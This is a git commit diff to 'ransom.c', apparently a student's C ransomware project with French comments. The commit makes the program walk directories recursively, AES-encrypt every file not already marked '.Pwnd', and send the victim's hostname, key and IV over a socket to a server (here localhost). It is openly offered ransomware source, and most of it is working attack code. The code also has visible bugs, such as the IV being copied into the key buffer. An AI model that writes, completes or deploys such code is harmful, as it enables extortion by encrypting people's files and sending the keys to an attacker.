096f21ee6bfa1f7a6a24b4e674594f3c6929ddbd
Julienpeps <julienpepinster@gmail.com>
2022-01-06 14:49:02 +0100

    Résolution bug relatif à strcmp() dans is_encrypted()

--- ransom.c
+++ ransom.c
@@ -4,14 +4,14 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <string.h>
 
 void usage();
 
-int is_encrypted(char *filename)
+int is_encrypted(char *file)
 {
-	char *ext = strrchr(filename, '.');
-
-	if (strcmp(ext, ".Pwnd") == 0)
+	// Si le nom du fichier contient .Pwnd
+	if (strstr(file, ".Pwnd") != NULL)
 	{
 		return 1;
 	}
@@ -39,19 +39,24 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			strcat(path, "/");
 			strcat(path, entry->d_name);
 
-			if (entry->d_type == DT_DIR) // Si entry est un dossier, l'envoie dans listdir()
+			if (entry->d_type == DT_DIR) // Check i entry est un dossier
 			{
+				// Récursivité
 				listdir(path, iv, key, de_flag);
 			}
-			else // Si entry est un fichier, le chiffre ou le déchiffre
+			else
 			{
-				if (de_flag == 'e')
+				// Check si le fichier est déjà chiffré
+				if (is_encrypted(entry->d_name) == 0)
 				{
-					encrypt(key, iv, path);
-				}
-				else if (de_flag == 'd')
-				{
-					decrypt(key, iv, path);
+					if (de_flag == 'e')
+					{
+						encrypt(key, iv, path);
+					}
+					else if (de_flag == 'd')
+					{
+						decrypt(key, iv, path);
+					}
 				}
 			}
 		}
@@ -65,11 +70,11 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	RAND_bytes(key, sizeKey);
 	RAND_bytes(iv, sizeIv);
 	// Conversion en hexadécimal
-	bytes_to_hexa(key, pKey, sizeKey/2+1);
-	bytes_to_hexa(iv, pIv, sizeIv/2+1);
+	bytes_to_hexa(key, pKey, sizeKey / 2);
+	bytes_to_hexa(iv, pIv, sizeIv / 2);
 }
 
-int send_key(char *pKey, char *pIv, char * serveraddress )
+int send_key(char *pKey, char *pIv, char *serveraddress)
 {
 	// Création de la socket
 	struct sockaddr_in server;
@@ -88,7 +93,6 @@ int send_key(char *pKey, char *pIv, char * serveraddress )
 	gethostname(hostname, 256);
 	send(sock, hostname, BUFSIZE, 0);
 
-
 	// Envoi de la clé et de l'IV
 	send(sock, pKey, BUFSIZE, 0);
 	send(sock, pIv, BUFSIZE, 0);
@@ -100,8 +104,11 @@ int main(int argc, char *argv[])
 	unsigned char key[AES_256_KEY_SIZE];
 	unsigned char iv[AES_BLOCK_SIZE];
 	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
-	char pKey[AES_256_KEY_SIZE/2];
-	char pIv[AES_BLOCK_SIZE/2];
+	char pKey[AES_256_KEY_SIZE / 2];
+	char pIv[AES_BLOCK_SIZE / 2];
+
+	char de_flag;
+	char *path;
 
 	if (argc > 1)
 	{
@@ -114,8 +121,8 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
-			char de_flag = 'e';
-			char *path = argv[2];
+			de_flag = 'e';
+			path = argv[2];
 		}
 		else if (strcmp(argv[1], "-d") == 0)
 		{
@@ -124,32 +131,43 @@ int main(int argc, char *argv[])
 				printf("Correct syntax: ransom -d key iv path\n");
 				return 0;
 			}
-			char de_flag = 'd';
+			de_flag = 'd';
 
-			if (sizeof(argv[2]) == AES_256_KEY_SIZE/2){
+			if (strlen(argv[2]) == AES_256_KEY_SIZE)
+			{
 				strcpy(pKey, argv[2]);
-			} else {
-				printf("Wrong key format");
-				return 0;
 			}
-			
-			if (sizeof(argv[3]) == AES_BLOCK_SIZE/2){
-				strcpy(pKey, argv[3]);
-			} else {
-				printf("Wrong key format");
+			else
+			{
+				printf("Wrong key format\n");
 				return 0;
 			}
 
+			if (strlen(argv[3]) == AES_BLOCK_SIZE)
+			{
+				strcpy(pKey, argv[3]);
+			}
+			else
+			{
+				printf("Wrong vector format\n");
+				return 0;
+			}
+
+			path = argv[4];
 		}
 		else
 		{ // Si ni -e ni -d -> Erreur
 			printf("You must specify -d or -e\n");
 		}
-	} else {
+	}
+	else
+	{
 		printf("You must specify -d or -e\n");
 	}
 
-	generate_key(key, sizeof(key), iv, sizeof(iv), pKey, pIv);
-	
+	generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
+
+	listdir(path, iv, key, de_flag);
+
 	send_key(pKey, pIv, "127.0.0.1");
 }
